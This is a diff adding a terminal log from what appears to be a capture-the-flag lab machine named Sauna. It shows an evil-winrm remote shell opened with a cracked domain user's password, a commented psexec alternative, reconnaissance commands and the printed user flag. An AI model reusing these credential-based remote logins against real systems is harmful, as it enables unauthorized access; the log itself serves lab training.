@@ -1,0 +1,44 @@
+user@kali:~/Downloads/tools/evil-winrm$ #impacket-psexec egotistical-bank.local/fsmith:Thestrokes23@10.10.10.175                            
+user@kali:~/Downloads/tools/evil-winrm$ bundle exec evil-winrm.rb -i 10.10.10.175 -u fsmith -p Thestrokes23                                 
+HERE                              
+
+Evil-WinRM shell v2.3             
+
+Info: Establishing connection to remote endpoint                     
+
+---HERE---                        
+*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami                    
+egotisticalbank\fsmith            
+*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..                     
+*Evil-WinRM* PS C:\Users\FSmith> cd Desktop                          
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir                         
+
+
+    Directory: C:\Users\FSmith\Desktop                               
+
+
+Mode                LastWriteTime         Length Name                
+----                -------------         ------ ----                
+-a----        1/23/2020  10:03 AM             34 user.txt            
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt               
+1b5520b98d97cf17f24122a55baf70cf  
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> hostname                    
+SAUNA                             
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> ipconfig                    
+
+Windows IP Configuration          
+
+
+Ethernet adapter Ethernet0:       
+
+   Connection-specific DNS Suffix  . :                               
+   IPv6 Address. . . . . . . . . . . : dead:beef::cd77:3522:338:b11e 
+   Link-local IPv6 Address . . . . . : fe80::cd77:3522:338:b11e%8    
+   IPv4 Address. . . . . . . . . . . : 10.10.10.175                  
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0                 
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7eaa%8    
+                                       fe80::250:56ff:feb9:8535%8    
+                                       10.10.10.2                    
+*Evil-WinRM* PS C:\Users\FSmith\Desktop>                             
